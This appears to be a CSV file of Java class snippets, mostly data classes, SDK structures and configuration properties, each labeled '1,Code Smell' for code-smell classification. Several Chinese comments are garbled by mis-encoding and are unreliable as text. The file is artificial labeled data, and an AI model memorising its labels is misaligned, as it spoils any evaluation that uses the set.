    this.guildId=j2;
    this.channelId=j3;
    this.sourceType=i2;
    this.forceTRTCSign=z;
    this.joinSourceType=str;
    this.channelType=i3;
  }
}",1,Code Smell
"public static class NET_CFG_Rect extends SdkStructure {
  public int nStructSize;
  public int nLeft;
  public int nTop;
  public int nRight;
  public int nBottom;
  public NET_CFG_Rect(){
    this.nStructSize=this.size();
  }
}
",1,Code Smell
"public static class EM_ROLL_SPEED_LEVEL extends SdkStructure {
  public static final int EM_ROLL_SPEED_LEVEL_UNKNOWN=0;
  public static final int EM_ROLL_SPEED_LEVEL_SLOW=1;
  public static final int EM_ROLL_SPEED_LEVEL_SLOWER=2;
  public static final int EM_ROLL_SPEED_LEVEL_MEDIUM=3;
  public static final int EM_ROLL_SPEED_LEVEL_FASTER=4;
  public static final int EM_ROLL_SPEED_LEVEL_FAST=5;
}",1,Code Smell
"public static class NET_DVR_DDNSPARA extends Structure {
  public byte[] sUsername=new byte[NAME_LEN];
  public byte[] sPassword=new byte[PASSWD_LEN];
  public byte[] sDomainName=new byte[64];
  public byte byEnableDDNS;
  public byte[] res=new byte[15];
}",1,Code Smell
"/** 
 * @Author : LarkMidTable
 * @Date : 2020/10/7 11:21
 * @Description : 甯搁噺鎻忚堪绫�
 */
public class Common {
  public static String PREFEX=""http://"";
  public static String LOCALADDRESS=""127.0.0.1"";
  public static String PORT=""8080"";
  public static String SERVERPORT=""server.port"";
  public static String CONTEXTPATH="""";
  public static String SERVERCONTEXTPATH=""server.contextPath"";
  public static String DOCPATH=""/doc.html"";
  public static String IndexPATH=""/index.html"";
}",1,Code Smell
"public static final class NEW_PANEL_FROM {
  public static final String NEW=""new"";
  public static final String NEW_INNER_TEMPLATE=""new_inner_template"";
  public static final String NEW_OUTER_TEMPLATE=""new_outer_template"";
  public static final String NEW_MARKET_TEMPLATE=""new_market_template"";
}
",1,Code Smell
"/** 
 * @description :
 * @author : liuxx
 * @date : 2021/3/26
 */
public class DsListBO {
  private Long dataInfoId;
  private String dataName;
  private String dataType;
  private String dataVersion;
  private String appNames;
  private String dataDesc;
  private String linkJson;
  private String dataJson;
  private Integer status;
  private Integer isMeta;
  private Date gmtModified;
  private String schemaName;
  private Integer dataTypeCode;
  public Integer getDataTypeCode(){
    return dataTypeCode;
  }
  public void setDataTypeCode(  Integer dataTypeCode){
    this.dataTypeCode=dataTypeCode;
  }
  public Long getDataInfoId(){
    return dataInfoId;
  }
  public void setDataInfoId(  Long dataInfoId){
    this.dataInfoId=dataInfoId;
  }
  public String getDataName(){
    return dataName;
  }
  public void setDataName(  String dataName){
    this.dataName=dataName;
  }
  public String getDataType(){
    return dataType;
  }
  public void setDataType(  String dataType){
    this.dataType=dataType;
  }
  public String getDataVersion(){
    return dataVersion;
  }
  public void setDataVersion(  String dataVersion){
    this.dataVersion=dataVersion;
  }
  public String getAppNames(){
    return appNames;
  }
  public void setAppNames(  String appNames){
    this.appNames=appNames;
  }
  public String getDataDesc(){
    return dataDesc;
  }
  public void setDataDesc(  String dataDesc){
    this.dataDesc=dataDesc;
  }
  public String getLinkJson(){
    return linkJson;
  }
  public void setLinkJson(  String linkJson){
    this.linkJson=linkJson;
  }
  public String getDataJson(){
    return dataJson;
  }
  public void setDataJson(  String dataJson){
    this.dataJson=dataJson;
  }
  public Integer getStatus(){
    return status;
  }
  public void setStatus(  Integer status){
    this.status=status;
  }
  public Integer getIsMeta(){
    return isMeta;
  }
  public void setIsMeta(  Integer isMeta){
    this.isMeta=isMeta;
  }
  public Date getGmtModified(){
    return gmtModified;
  }
  public void setGmtModified(  Date gmtModified){
    this.gmtModified=gmtModified;
  }
  public String getSchemaName(){
    return schemaName;
  }
  public void setSchemaName(  String schemaName){
    this.schemaName=schemaName;
  }
}",1,Code Smell
"public static class ExceptionMessage extends SqlpadMessage {
  private static final long serialVersionUID=1L;
  private String content;
  private String detailTrace;
  public ExceptionMessage(){
    super();
  }
  public ExceptionMessage(  String content){
    super();
    this.content=content;
  }
  public String getContent(){
    return content;
  }
  public void setContent(  String content){
    this.content=content;
  }
  public String getDetailTrace(){
    return detailTrace;
  }
  public void setDetailTrace(  String detailTrace){
    this.detailTrace=detailTrace;
  }
  public void setDetailTrace(  Throwable t){
    this.detailTrace=OperationMessage.printThrowableTrace(t);
  }
}",1,Code Smell
"public static class C2CPicDownReq extends ReqCommon {
  public int fileType;
  public boolean isContact;
  public int msgTime;
  public int protocolType;
  public String storageSource;
  public String uuid;
}",1,Code Smell
"@Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final class CrawlBatchTask extends SqlTable {
  public final SqlColumn<Long> id=column(""id"",JDBCType.BIGINT);
  public final SqlColumn<Integer> sourceId=column(""source_id"",JDBCType.INTEGER);
  public final SqlColumn<Integer> crawlCountSuccess=column(""crawl_count_success"",JDBCType.INTEGER);
  public final SqlColumn<Integer> crawlCountTarget=column(""crawl_count_target"",JDBCType.INTEGER);
  public final SqlColumn<Byte> taskStatus=column(""task_status"",JDBCType.TINYINT);
  public final SqlColumn<Date> startTime=column(""start_time"",JDBCType.TIMESTAMP);
  public final SqlColumn<Date> endTime=column(""end_time"",JDBCType.TIMESTAMP);
  public CrawlBatchTask(){
    super(""crawl_batch_task"");
  }
}
",1,Code Smell
"/** 
 * OpenAI Image autoconfiguration properties.
 * @author Thomas Vitale
 * @since 0.8.0
 */
@ConfigurationProperties(OpenAiImageProperties.CONFIG_PREFIX) public class OpenAiImageProperties extends OpenAiParentProperties {
  public static final String CONFIG_PREFIX=""spring.ai.openai.image"";
  public static final String DEFAULT_IMAGE_MODEL=OpenAiImageApi.ImageModel.DALL_E_3.getValue();
  /** 
 * Enable OpenAI Image client.
 */
  private boolean enabled=true;
  /** 
 * Options for OpenAI Image API.
 */
  @NestedConfigurationProperty private OpenAiImageOptions options=OpenAiImageOptions.builder().withModel(DEFAULT_IMAGE_MODEL).build();
  public OpenAiImageOptions getOptions(){
    return options;
  }
  public void setOptions(  OpenAiImageOptions options){
    this.options=options;
  }
  public boolean isEnabled(){
    return this.enabled;
  }
  public void setEnabled(  boolean enabled){
    this.enabled=enabled;
  }
}",1,Code Smell
"public static class ShareExtraInfo {
  public long appId;
  public AppInfo appInfo;
  public String audioUrl;
  public boolean enableServerSendMsg;
  public int forwardType;
  public String imageUrl;
  public int imageUrlStatus;
  public String pkgName;
  public int serviceType;
  public int shortUrlStatus;
  public String summary;
  public String targetUrl;
  public String title;
}
",1,Code Smell
"/** 
 * @author derekyi
 * @date 2020/11/22
 */
public class HelloService implements ApplicationContextAware, BeanFactoryAware {
  private ApplicationContext applicationContext;
  private BeanFactory beanFactory;
  public String sayHello(){
    System.out.println(""hello"");
    return ""hello"";
  }
  @Override public void setBeanFactory(  BeanFactory beanFactory) throws BeansException {
    this.beanFactory=beanFactory;
  }
  @Override public void setApplicationContext(  ApplicationContext applicationContext) throws BeansException {
    this.applicationContext=applicationContext;
  }
  public ApplicationContext getApplicationContext(){
    return applicationContext;
  }
  public BeanFactory getBeanFactory(){
    return beanFactory;
  }
}",1,Code Smell
"public class LedContents implements Serializable {
  private String contents1;
  private String contents2;
  private String contents3;
  private String contents4;
  private String voiceContents;
  public String getContents1(){
    return contents1;
  }
  public void setContents1(  String contents1){
    this.contents1=contents1;
  }
  public String getContents2(){
    return contents2;
  }
  public void setContents2(  String contents2){
    this.contents2=contents2;
  }
  public String getContents3(){
    return contents3;
  }
  public void setContents3(  String contents3){
    this.contents3=contents3;
  }
  public String getContents4(){
    return contents4;
  }
  public void setContents4(  String contents4){
    this.contents4=contents4;
  }
  public String getVoiceContents(){
    return voiceContents;
  }
  public void setVoiceContents(  String voiceContents){
    this.voiceContents=voiceContents;
  }
}",1,Code Smell
"/** 
 * <p>Description: 瑙掕壊淇℃伅 <锛弍> <p>Copyright: alibaba (c) 2017<锛弍> <p>Company: alibaba <锛弍>
 * @author tandong.td@alibaba-inc.com
 * @version 1.0
 * @date 2017/5/7 涓嬪崍2:44
 */
public class TeslaRoleVO {
  /** 
 * 瑙掕壊缂栫爜
 */
  private String roleCode;
  /** 
 * 瑙掕壊鍚嶇О
 */
  private String roleName;
  /** 
 * 瑙掕壊褰掑睘浜
 */
  private String roleOwner;
  /** 
 * 鎻忚堪
 */
  private String memo;
  public String getRoleCode(){
    return roleCode;
  }
  public void setRoleCode(  String roleCode){
    this.roleCode=roleCode;
  }
  public String getRoleName(){
    return roleName;
  }
  public void setRoleName(  String roleName){
    this.roleName=roleName;
  }
  public String getMemo(){
    return memo;
  }
  public void setMemo(  String memo){
    this.memo=memo;
  }
  public String getRoleOwner(){
    return roleOwner;
  }
  public void setRoleOwner(  String roleOwner){
    this.roleOwner=roleOwner;
  }
}",1,Code Smell
"/** 
 * @Author : 灏樹簩(chener @ dtstack.com)
 * @Date : 2018/12/17 11:36
 * @Description : 甯﹂壌鏉 token 鍩虹被
 */
public class DtInsightAuthParam extends BaseParam {
  /** 
 * token 閴存潈淇℃伅锛屽鏋滃～鍐欎細瑕嗙洊鎺夋敞鍐岀殑 token 淇℃伅
 */
  @ApiModelProperty(hidden=true) private String token;
  @ApiModelProperty(value=""绉熸埛id"",example=""1"") private Long tenantId;
  @ApiModelProperty(value=""鐢ㄦ埛id"",example=""1"") private Long userId;
  public String getToken(){
    return token;
  }
  public void setToken(  String token){
    this.token=token;
  }
  public Long getTenantId(){
    return tenantId;
  }
  public void setTenantId(  Long tenantId){
    this.tenantId=tenantId;
  }
  public Long getUserId(){
    return userId;
  }
  public void setUserId(  Long userId){
    this.userId=userId;
  }
}",1,Code Smell
"/** 
 * @author wuxiang
 * @author yusu
 */
public class DiagramNode {
  private String g;
  private boolean visible;
  public String getG(){
    return g;
  }
  public void setG(  String g){
    this.g=g;
  }
  public void setVisible(  boolean visible){
    this.visible=visible;
  }
  boolean isVisible(){
    return true;
  }
}
",1,Code Smell
"public abstract class AudioInfo {
  protected String brand;
  protected String version;
  protected long duration;
  protected String title;
  protected String artist;
  protected String albumArtist;
  protected String album;
  protected short year;
  protected String genre;
  protected String comment;
  protected short track;
  protected short tracks;
  protected short disc;
  protected short discs;
  protected String copyright;
  protected String composer;
  protected String grouping;
  protected boolean compilation;
  protected String lyrics;
  protected Bitmap cover;
  protected Bitmap smallCover;
  public String getBrand(){
    return brand;
  }
  public String getVersion(){
    return version;
  }
  public long getDuration(){
    return duration;
  }
  public String getTitle(){
    return title;
  }
  public String getArtist(){
    return artist;
  }
  public String getAlbumArtist(){
    return albumArtist;
  }
  public String getAlbum(){
    return album;
  }
  public short getYear(){
    return year;
  }
  public String getGenre(){
    return genre;
  }
  public String getComment(){
    return comment;
  }
  public short getTrack(){
    return track;
  }
  public short getTracks(){
    return tracks;
  }
  public short getDisc(){
    return disc;
  }
  public short getDiscs(){
    return discs;
  }
  public String getCopyright(){
    return copyright;
  }
  public String getComposer(){
    return composer;
  }
  public String getGrouping(){
    return grouping;
  }
  public boolean isCompilation(){
    return compilation;
  }
  public String getLyrics(){
    return lyrics;
  }
  public Bitmap getCover(){
    return cover;
  }
  public Bitmap getSmallCover(){
    return smallCover;
  }
  public static AudioInfo getAudioInfo(  File file){
    try {
      byte header[]=new byte[12];
      RandomAccessFile randomAccessFile=new RandomAccessFile(file,""r"");
      randomAccessFile.readFully(header,0,8);
      randomAccessFile.close();
      InputStream input=new BufferedInputStream(new FileInputStream(file));
      if (header[4] == 'f' && header[5] == 't' && header[6] == 'y' && header[7] == 'p') {
        return new M4AInfo(input);
      }
 else       if (file.getAbsolutePath().endsWith(""mp3"")) {
        return new MP3Info(input,file.length());
      }
 else       if (file.getAbsolutePath().endsWith(""flac"")) {
        return new GenAudioInfo(file,""FLAC"");
      }
 else       if (file.getAbsolutePath().endsWith(""ogg"")) {
        return new GenAudioInfo(file,""OGG"");
      }
 else {
        return null;
      }
    }
 catch (    Exception e) {
      return null;
    }
  }
}",1,Code Smell
"/** 
 * Created with IntelliJ IDEA. User: anirudha Date: 4/21/13 Time: 10:21 PM
 * @author anirudha
 */
public class Message {
  private static final String FILE_SEP=""-"";
  private final Topic topic;
  private final String content;
  private final Long creationTime;
  private final Long counter;
  private final File file;
  public Message(  Topic topic,  String content,  Long time,  Long id){
    this.topic=topic;
    this.content=content;
    this.creationTime=time;
    this.counter=id;
    this.file=new File(Long.toString(this.creationTime) + FILE_SEP + Long.toString(this.counter));
  }
  public Message(  File message_file) throws IOException {
    String[] parts=message_file.getName().split(FILE_SEP);
    this.creationTime=Long.parseLong(parts[0]);
    this.counter=Long.parseLong(parts[1]);
    this.file=message_file;
    String[] parentDirs=message_file.getParent().split(File.pathSeparator);
    this.topic=new Topic(parentDirs[parentDirs.length - 1]);
    BufferedReader rdr=new BufferedReader(new FileReader(message_file));
    String line=null;
    StringBuffer buf=new StringBuffer();
    while ((line=rdr.readLine()) != null) {
      buf.append(line);
    }
    this.content=buf.toString();
  }
  public Long getCreationTime(){
    return creationTime;
  }
  public Long getCounter(){
    return counter;
  }
  public Topic getTopic(){
    return this.topic;
  }
  public String getContent(){
    return this.content;
  }
  public File getFile(){
    return this.file;
  }
}",1,Code Smell
"/** 
 * Metrics for  {@link HttpServerHandler}. 
 */
public class HttpServerHandlerMetrics {
  /** 
 * An instance shared by all HttpServerHandlers. 
 */
  private static final HttpServerHandlerMetrics INSTANCE=new HttpServerHandlerMetrics();
  public final LongCounterMetric httpConnectionsNum;
  public final LongCounterMetric handlingRequestsNum;
  public final Histogram requestHandleLatencyMs;
  private HttpServerHandlerMetrics(){
    HttpMetricRegistry httpMetricRegistry=HttpMetricRegistry.getInstance();
    this.httpConnectionsNum=new LongCounterMetric(HTTP_CONNECTIONS_NUM,Metric.MetricUnit.NOUNIT,""the number of established http connections currently"");
    httpMetricRegistry.registerCounter(httpConnectionsNum);
    this.handlingRequestsNum=new LongCounterMetric(HTTP_HANDLING_REQUESTS_NUM,Metric.MetricUnit.NOUNIT,""the number of http requests that is being handled"");
    httpMetricRegistry.registerCounter(handlingRequestsNum);
    this.requestHandleLatencyMs=httpMetricRegistry.registerHistogram(HTTP_REQUEST_HANDLE_LATENCY_MS);
  }
  public static HttpServerHandlerMetrics getInstance(){
    return INSTANCE;
  }
}
",1,Code Smell
"/** 
 * @author wuxiang
 * @author yusu
 */
public class LoopProcessNode extends FlowNode implements NodeContainer<FlowNode>, Stateless {
  private String loopType;
  private String variableClass;
  private String variableName;
  private String indexVarName;
  private String collectionVarName;
  private String whileExpression;
  private String startNodeId;
  private String endNodeId;
  private List<FlowNode> flowNodes=new ArrayList<>();
  public String getLoopType(){
    return loopType;
  }
  public void setLoopType(  String loopType){
    this.loopType=loopType;
  }
  public String getVariableClass(){
    return variableClass;
  }
  public void setVariableClass(  String variableClass){
    this.variableClass=variableClass;
  }
  public String getVariableName(){
    return variableName;
  }
  public void setVariableName(  String variableName){
    this.variableName=variableName;
  }
  public String getIndexVarName(){
    return indexVarName;
  }
  public void setIndexVarName(  String indexVarName){
    this.indexVarName=indexVarName;
  }
  public String getCollectionVarName(){
    return collectionVarName;
  }
  public void setCollectionVarName(  String collectionVarName){
    this.collectionVarName=collectionVarName;
  }
  public String getWhileExpression(){
    return whileExpression;
  }
  public void setWhileExpression(  String whileExpression){
    this.whileExpression=whileExpression;
  }
  public String getStartNodeId(){
    return startNodeId;
  }
  public void setStartNodeId(  String startNodeId){
    this.startNodeId=startNodeId;
  }
  public String getEndNodeId(){
    return endNodeId;
  }
  public void setEndNodeId(  String endNodeId){
    this.endNodeId=endNodeId;
  }
  @Override public FlowNode getNode(  String id){
    return flowNodes.stream().filter(node -> id.equals(node.getId())).findFirst().orElseThrow(() -> new CompileFlowException(""Undefined node, node id is "" + id));
  }
  @Override public void addNode(  FlowNode node){
    flowNodes.add(node);
  }
  public FlowNode getNodeByTag(  String tag){
    return flowNodes.stream().filter(node -> tag.equals(node.getTag())).findFirst().orElseThrow(() -> new CompileFlowException(""Undefined node, node tag is "" + tag));
  }
  @Override public List<FlowNode> getAllNodes(){
    return flowNodes;
  }
  @Override public FlowNode getStartNode(){
    return flowNodes.stream().filter(node -> node.getId().equals(startNodeId)).findFirst().orElseThrow(() -> new CompileFlowException(""No start node found""));
  }
  @Override public FlowNode getEndNode(){
    return flowNodes.stream().filter(node -> node.getId().equals(endNodeId)).findFirst().orElseThrow(() -> new CompileFlowException(""No end node found""));
  }
}
",1,Code Smell
"public class CSVDataSetProperty {
  public static final String IGNORE_FIRST_LINE=""ignoreFirstLine"";
  public static final String STOP_THREAD=""stopThread"";
  public static final String FILE_NAME=""filename"";
  public static final String SHARE_MODE=""shareMode"";
  public static final String RECYCLE=""recycle"";
  public static final String DELIMITER=""delimiter"";
  public static final String QUOTED_DATA=""quotedData"";
  public static final String SHARE_MODE_GROUP=""shareMode.group"";
  public static final String SHARE_MODE_THREAD=""shareMode.thread"";
  public static final String VARIABLE_NAMES=""variableNames"";
}
",1,Code Smell
"public static class Bean9 {
  public String f0;
  public String f1;
  public String f2;
  public String f3;
  public String f4;
  public String f5;
  public String f6;
  public String f7;
  public String f8;
}",1,Code Smell
"public static class EM_NET_VEHICLE_TYPE extends SdkStructure {
  public static final int NET_VEHICLE_TYPE_UNKNOW=0;
  public static final int NET_VEHICLE_TYPE_MOTOR=1;
  public static final int NET_VEHICLE_TYPE_NON_MOTOR=2;
  public static final int NET_VEHICLE_TYPE_BUS=3;
  public static final int NET_VEHICLE_TYPE_BICYCLE=4;
  public static final int NET_VEHICLE_TYPE_MOTORCYCLE=5;
  public static final int NET_VEHICLE_TYPE_UNLICENSEDMOTOR=6;
  public static final int NET_VEHICLE_TYPE_LARGECAR=7;
  public static final int NET_VEHICLE_TYPE_MICROCAR=8;
  public static final int NET_VEHICLE_TYPE_EMBASSYCAR=9;
  public static final int NET_VEHICLE_TYPE_MARGINALCAR=10;
  public static final int NET_VEHICLE_TYPE_AREAOUTCAR=11;
  public static final int NET_VEHICLE_TYPE_FOREIGNCAR=12;
  public static final int NET_VEHICLE_TYPE_DUALTRIWHEELMOTORCYCLE=13;
  public static final int NET_VEHICLE_TYPE_LIGHTMOTORCYCLE=14;
  public static final int NET_VEHICLE_TYPE_EMBASSYMOTORCYCLE=15;
  public static final int NET_VEHICLE_TYPE_MARGINALMOTORCYCLE=16;
  public static final int NET_VEHICLE_TYPE_AREAOUTMOTORCYCLE=17;
  public static final int NET_VEHICLE_TYPE_FOREIGNMOTORCYCLE=18;
  public static final int NET_VEHICLE_TYPE_FARMTRANSMITCAR=19;
  public static final int NET_VEHICLE_TYPE_TRACTOR=20;
  public static final int NET_VEHICLE_TYPE_TRAILER=21;
  public static final int NET_VEHICLE_TYPE_COACHCAR=22;
  public static final int NET_VEHICLE_TYPE_COACHMOTORCYCLE=23;
  public static final int NET_VEHICLE_TYPE_TRIALCAR=24;
  public static final int NET_VEHICLE_TYPE_TRIALMOTORCYCLE=25;
  public static final int NET_VEHICLE_TYPE_TEMPORARYENTRYCAR=26;
  public static final int NET_VEHICLE_TYPE_TEMPORARYENTRYMOTORCYCLE=27;
  public static final int NET_VEHICLE_TYPE_TEMPORARYSTEERCAR=28;
  public static final int NET_VEHICLE_TYPE_PASSENGERCAR=29;
  public static final int NET_VEHICLE_TYPE_LARGETRUCK=30;
  public static final int NET_VEHICLE_TYPE_MIDTRUCK=31;
  public static final int NET_VEHICLE_TYPE_SALOONCAR=32;
  public static final int NET_VEHICLE_TYPE_MICROBUS=33;
  public static final int NET_VEHICLE_TYPE_MICROTRUCK=34;
  public static final int NET_VEHICLE_TYPE_TRICYCLE=35;
  public static final int NET_VEHICLE_TYPE_PASSERBY=36;
}",1,Code Smell
"public class Event {
  private byte[] body;
  private String groupId;
  private String streamId;
  private long dt;
  private int tryTimes=0;
  ArrayList<byte[]> bodylist=new ArrayList<byte[]>();
  public Event(  byte[] body,  String groupId,  String streamId,  long dt){
    super();
    this.body=body;
    this.groupId=groupId;
    this.streamId=streamId;
    this.dt=dt;
    this.setTryTimes(0);
  }
  public Event(  ArrayList<byte[]> bodylist,  String groupId,  String streamId,  long dt){
    super();
    this.bodylist=bodylist;
    this.groupId=groupId;
    this.streamId=streamId;
    this.dt=dt;
    this.setTryTimes(0);
  }
  public ArrayList<byte[]> getBodylist(){
    return bodylist;
  }
  public void setBodylist(  ArrayList<byte[]> bodylist){
    this.bodylist=bodylist;
  }
  public byte[] getBody(){
    return body;
  }
  public void setBody(  byte[] body){
    this.body=body;
  }
  public String getGroupId(){
    return groupId;
  }
  public void setGroupId(  String groupId){
    this.groupId=groupId;
  }
  public String getStreamId(){
    return streamId;
  }
  public void setStreamId(  String streamId){
    this.streamId=streamId;
  }
  public long getDt(){
    return dt;
  }
  public void setDt(  long dt){
    this.dt=dt;
  }
  public int getTryTimes(){
    return tryTimes;
  }
  public void setTryTimes(  int tryTimes){
    this.tryTimes=tryTimes;
  }
}",1,Code Smell
"/** 
 * harris
 */
public class K8sNameSpace {
  private List<NameSpace> children;
  private String name;
  private String k8sId;
  public List<NameSpace> getChildren(){
    return children;
  }
  public void setChildren(  List<NameSpace> children){
    this.children=children;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getK8sId(){
    return k8sId;
  }
  public void setK8sId(  String k8sId){
    this.k8sId=k8sId;
  }
}",1,Code Smell
"public static class CFG_VIDEO_COMPRESSION extends SdkStructure {
  public static final int VIDEO_FORMAT_MPEG4=0;
  public static final int VIDEO_FORMAT_MS_MPEG4=VIDEO_FORMAT_MPEG4 + 1;
  public static final int VIDEO_FORMAT_MPEG2=VIDEO_FORMAT_MS_MPEG4 + 1;
  public static final int VIDEO_FORMAT_MPEG1=VIDEO_FORMAT_MPEG2 + 1;
  public static final int VIDEO_FORMAT_H263=VIDEO_FORMAT_MPEG1 + 1;
  public static final int VIDEO_FORMAT_MJPG=VIDEO_FORMAT_H263 + 1;
  public static final int VIDEO_FORMAT_FCC_MPEG4=VIDEO_FORMAT_MJPG + 1;
  public static final int VIDEO_FORMAT_H264=VIDEO_FORMAT_FCC_MPEG4 + 1;
  public static final int VIDEO_FORMAT_H265=VIDEO_FORMAT_H264 + 1;
}",1,Code Smell
"/** 
 * The properties for stat reporter.
 * @author Haotian Zhang
 */
@ConfigurationProperties(""spring.cloud.polaris.stat"") public class PolarisStatProperties {
  /** 
 * If state reporter enabled.
 */
  private boolean enabled=true;
  /** 
 * Local host for prometheus to pull.
 */
  private String host;
  /** 
 * Port for prometheus to pull. 0 for random from 20000 to 65535.
 */
  private int port=0;
  /** 
 * Path for prometheus to pull.
 */
  private String path=""/metrics"";
  /** 
 * If state pushGateway reporter enabled.
 */
  @Value(""${spring.cloud.polaris.stat.pushgateway.enabled:#{false}}"") private boolean pushGatewayEnabled=false;
  /** 
 * PushGateway address.
 */
  @Value(""${spring.cloud.polaris.stat.pushgateway.address:}"") private String pushGatewayAddress;
  /** 
 * Push metrics interval. unit: milliseconds default 30s.
 */
  @Value(""${spring.cloud.polaris.stat.pushgateway.push-interval:#{30000}}"") private Long pushGatewayPushInterval=30 * 1000L;
  public boolean isEnabled(){
    return enabled;
  }
  public void setEnabled(  boolean enabled){
    this.enabled=enabled;
  }
  public String getHost(){
    return host;
  }
  public void setHost(  String host){
    this.host=host;
  }
  public int getPort(){
    return port;
  }
  public void setPort(  int port){
    this.port=port;
  }
  public String getPath(){
    return path;
  }
  public void setPath(  String path){
    this.path=path;
  }
  public boolean isPushGatewayEnabled(){
    return pushGatewayEnabled;
  }
  public void setPushGatewayEnabled(  boolean pushGatewayEnabled){
    this.pushGatewayEnabled=pushGatewayEnabled;
  }
  public String getPushGatewayAddress(){
    return pushGatewayAddress;
  }
  public void setPushGatewayAddress(  String pushGatewayAddress){
    this.pushGatewayAddress=pushGatewayAddress;
  }
  public Long getPushGatewayPushInterval(){
    return pushGatewayPushInterval;
  }
  public void setPushGatewayPushInterval(  Long pushGatewayPushInterval){
    this.pushGatewayPushInterval=pushGatewayPushInterval;
  }
}",1,Code Smell
"public static class ClearViewData {
  public String color;
  Paint paint=new Paint(Paint.ANTI_ALIAS_FLAG);
  public boolean clear=true;
  boolean firstDraw=false;
  public long size;
  private final StorageDiagramView parentView;
  public ClearViewData(  StorageDiagramView parentView){
    this.parentView=parentView;
    paint.setStyle(Paint.Style.STROKE);
    paint.setStrokeWidth(AndroidUtilities.dp(5));
    paint.setStrokeCap(Paint.Cap.ROUND);
    paint.setStrokeJoin(Paint.Join.ROUND);
  }
  public void setClear(  boolean clear){
    if (this.clear != clear) {
      this.clear=clear;
      firstDraw=true;
    }
  }
}",1,Code Smell
"public static class NET_DVR_VIDEOWALLWINDOWPOSITION extends Structure {
  public int dwSize;
  public byte byEnable;
  public byte byWndOperateMode;
  public byte[] byRes1=new byte[6];
  public int dwWindowNo;
  public int dwLayerIndex;
  public NET_DVR_RECTCFG_EX struRect;
  public NET_DVR_RECTCFG_EX struResolution;
  public int dwXCoordinate;
  public int dwYCoordinate;
  public byte[] byRes2=new byte[36];
}",1,Code Smell
"public class CfCouponActivityCouponTypeQuery implements Serializable {
  private String id;
  @ApiModelProperty(value=""浼樻儬鍒告椿鍔╥d"",required=true) private String couponActivityId;
  private Long fixedExtensionTime;
  private BigDecimal denomination;
  @ApiModelProperty(value=""浼樻儬鍒哥被鍨(1-娆℃暟鍒/2-閲戦鍒/3-鏃堕暱鍒)"",required=false) private Byte couponType;
  @ApiModelProperty(value=""鎺掑簭鏉′欢"",required=false) private String orderBy;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getCouponActivityId(){
    return couponActivityId;
  }
  public void setCouponActivityId(  String couponActivityId){
    this.couponActivityId=couponActivityId == null ? null : couponActivityId.trim();
  }
  public Long getFixedExtensionTime(){
    return fixedExtensionTime;
  }
  public void setFixedExtensionTime(  Long fixedExtensionTime){
    this.fixedExtensionTime=fixedExtensionTime;
  }
  public BigDecimal getDenomination(){
    return denomination;
  }
  public void setDenomination(  BigDecimal denomination){
    this.denomination=denomination;
  }
  public String getOrderBy(){
    return orderBy;
  }
  public void setOrderBy(  String orderBy){
    this.orderBy=orderBy;
  }
  public Byte getCouponType(){
    return couponType;
  }
  public void setCouponType(  Byte couponType){
    this.couponType=couponType;
  }
}",1,Code Smell
"public static class EM_STREAM_PROTOCOL_TYPE extends SdkStructure {
  public static final int EM_STREAM_PROTOCOL_UNKNOWN=0;
  public static final int EM_STREAM_PROTOCOL_PRIVATE_V2=1;
  public static final int EM_STREAM_PROTOCOL_PRIVATE_V3=2;
  public static final int EM_STREAM_PROTOCOL_RTSP=3;
  public static final int EM_STREAM_PROTOCOL_ONVIF=4;
  public static final int EM_STREAM_PROTOCOL_GB28181=5;
  public static final int EM_DEV_PROTOCOL_EHOME=6;
  public static final int EM_DEV_PROTOCOL_HIKVISION=7;
  public static final int EM_DEV_PROTOCOL_BSCP=8;
  public static final int EM_DEV_PROTOCOL_PRIVATE=9;
}",1,Code Smell
"/** 
 * @ClassName Timeval
 * @Author 闅斿灏忕帇瀛 981011512@qq.com
 * @Date 2020/5/1/001 14:57
 * @Version 1.0
 */
public class Timeval implements Serializable {
  Integer decyear;
  Integer decmon;
  Integer decday;
  Integer dechour;
  Integer decmin;
  Integer decsec;
  Integer sec;
  Integer usec;
  public Integer getDecyear(){
    return decyear;
  }
  public void setDecyear(  Integer decyear){
    this.decyear=decyear;
  }
  public Integer getDecmon(){
    return decmon;
  }
  public void setDecmon(  Integer decmon){
    this.decmon=decmon;
  }
  public Integer getDecday(){
    return decday;
  }
  public void setDecday(  Integer decday){
    this.decday=decday;
  }
  public Integer getDechour(){
    return dechour;
  }
  public void setDechour(  Integer dechour){
    this.dechour=dechour;
  }
  public Integer getDecmin(){
    return decmin;
  }
  public void setDecmin(  Integer decmin){
    this.decmin=decmin;
  }
  public Integer getDecsec(){
    return decsec;
  }
  public void setDecsec(  Integer decsec){
    this.decsec=decsec;
  }
  public Integer getSec(){
    return sec;
  }
  public void setSec(  Integer sec){
    this.sec=sec;
  }
  public Integer getUsec(){
    return usec;
  }
  public void setUsec(  Integer usec){
    this.usec=usec;
  }
}",1,Code Smell
"/** 
 * @author godotg
 */
@Protocol(id=104) public class SimpleObject {
  private int c;
  private boolean g;
  public int getC(){
    return c;
  }
  public void setC(  int c){
    this.c=c;
  }
  public boolean isG(){
    return g;
  }
  public void setG(  boolean g){
    this.g=g;
  }
}",1,Code Smell
"public static class CFG_DEVRECORD_INFO extends SdkStructure {
  public byte[] szDevName=new byte[MAX_NAME_LEN];
  public byte[] szIP=new byte[MAX_ADDRESS_LEN];
  public byte[] szChannel=new byte[MAX_NAME_LEN];
  public byte[] szChannelName=new byte[MAX_NAME_LEN];
  public byte[] szStoragePosition=new byte[MAX_NAME_LEN];
  public byte byStatus;
  public byte[] byReserved=new byte[3];
}",1,Code Smell
"class SparkDetailLog {
  private String id;
  private String value;
  SparkDetailLog(  String id,  String value){
    this.id=id;
    this.value=value;
  }
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id;
  }
  public String getValue(){
    return value;
  }
  public void setValue(  String value){
    this.value=value;
  }
}
",1,Code Smell
"/** 
 * DataProxyCluster
 */
public class DataProxyCluster {
  private ProxyClusterObject proxyCluster=new ProxyClusterObject();
  private CacheClusterSetObject cacheClusterSet=new CacheClusterSetObject();
  /** 
 * get proxyCluster
 * @return the proxyCluster
 */
  public ProxyClusterObject getProxyCluster(){
    return proxyCluster;
  }
  /** 
 * set proxyCluster
 * @param proxyCluster the proxyCluster to set
 */
  public void setProxyCluster(  ProxyClusterObject proxyCluster){
    this.proxyCluster=proxyCluster;
  }
  /** 
 * get cacheClusterSet
 * @return the cacheClusterSet
 */
  public CacheClusterSetObject getCacheClusterSet(){
    return cacheClusterSet;
